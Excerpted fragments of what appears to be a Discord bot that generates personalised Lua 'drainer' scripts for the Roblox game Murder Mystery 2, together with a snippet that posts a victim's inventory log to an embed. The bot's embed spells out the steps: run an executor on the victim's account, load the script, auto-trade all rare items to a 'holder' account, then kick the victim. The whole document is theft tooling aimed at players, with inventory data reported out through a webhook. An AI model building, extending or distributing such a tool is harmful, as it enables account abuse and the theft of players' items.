...
local function BuildEmbed(ReceiverName)
    ...
    if PasteUrl then
        table.insert(EmbedFields, {name = "▸ Full Inventory", value = "[View Full Log](" .. PasteUrl .. ")", inline = false})
    end
...
client.on("messageCreate", async (message) => {
  ...
  if (args.length < 2) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xED4245)
          .setDescription("❌ **Invalid usage**\n\`\`\`!generate <holder_username> <webhook_url>\`\`\`")
      ]
    });
  }
  ...
  const file   = new AttachmentBuilder(buffer, { name: `mm2_${holder}.lua` });

  const embed = new EmbedBuilder()
    .setColor(0x5865F2)
    .setAuthor({ name: "MM2 Drainer — Script Generated" })
    .setDescription(
      "Your personalized drainer script is ready.\n" +
      "Load it into your executor while the **holder is in the same MM2 server**."
    )
    .addFields(
      {
        name: "▸ Configuration",
      ...
      {
        name: "▸ Trade Tiers",
        value: "`Godly` `Ancient` `Vintage` `Unique` `Chroma`",
        inline: false
      },
      {
        name: "▸ Steps",
        value: "1. Have holder join the victim's MM2 server\n2. Attach executor on victim's account\n3. Load & execute the `.lua` file\n4. Script auto-trades all items → kicks victim when done",
        inline: false
      }
    )
    .setFooter({ text: "mm2 drainer • generated" })
    .setTimestamp();
